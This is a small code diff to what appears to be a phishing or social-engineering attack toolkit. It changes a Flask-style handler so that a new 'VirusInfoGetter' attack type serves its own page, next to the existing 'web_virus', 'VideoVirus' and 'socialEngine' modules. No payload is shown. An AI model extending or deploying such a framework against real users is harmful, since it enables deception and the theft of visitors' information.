@@ -316,8 +316,10 @@ def attack_url(attack_url):
         try:
             if u.attack_type == 'web_virus':
                 r.data = open('modules/web_virus/index.html').read()
-            if u.attack_type == 'VideoVirus':
+            elif u.attack_type == 'VideoVirus':
                 r.data = open('modules/VideoVirus/index.html').read()
+            elif u.attack_type == 'VirusInfoGetter':
+                r.data = open('modules/VirusInfoGetter/index.html').read()
             else:
                 # print('modules/socialEngine/'+u.attack_type+"/index.html")
                 # print(open('modules/socialEngine/'+str(u.attack_type)+"/index.html").read())
